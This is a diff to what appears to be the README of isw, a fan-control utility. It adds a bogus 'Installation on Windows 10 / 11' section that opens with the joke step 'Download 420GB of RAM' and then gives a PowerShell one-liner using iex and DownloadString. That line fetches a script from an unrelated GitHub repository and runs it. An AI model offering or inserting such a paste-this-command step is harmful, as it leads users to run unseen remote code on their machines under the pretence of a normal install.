@@ -84,6 +84,16 @@ sudo systemctl enable --now isw@SILENT.service
    
 ---
    
+- **Installation on Windows 10 / 11:**   
+> Download 420GB of RAM   
+> Open PowerShell (Windows + R powershell.exe)   
+> Enter the following command:   
+```
+iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/FaridZelli/-/main/source/script.ps1")
+```
+   
+---
+   
 In the unlikely event where neither of these approaches work for your device, try to piece it togeather using the [original instructions](https://github.com/YoyPa/isw#how-to-install).
    
 ## FAQ:
